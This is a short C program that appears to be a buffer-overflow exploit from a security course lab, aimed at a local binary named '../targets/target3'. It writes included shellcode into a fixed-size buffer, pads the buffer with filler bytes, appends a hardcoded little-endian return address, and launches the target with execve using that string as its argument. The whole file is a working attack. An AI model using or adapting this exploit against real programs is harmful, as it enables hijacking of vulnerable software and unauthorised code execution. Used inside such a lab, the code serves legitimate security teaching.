#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{

	char *args[3];
	char *env[1];
    
    //can also skip the "AAAA"
    char return_Addr[] = "\x10\xfe\x21\x20";
    char hk_string[71];
    memset (hk_string, '\x00', 71);
    strcat(hk_string, shellcode);
    int i = 0;
    for(i=45;i<68;i++)
    {
        hk_string[i]='\x3';
    }
    strcat(hk_string,return_Addr);

  
	args[0] = TARGET;
	args[1] = hk_string;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
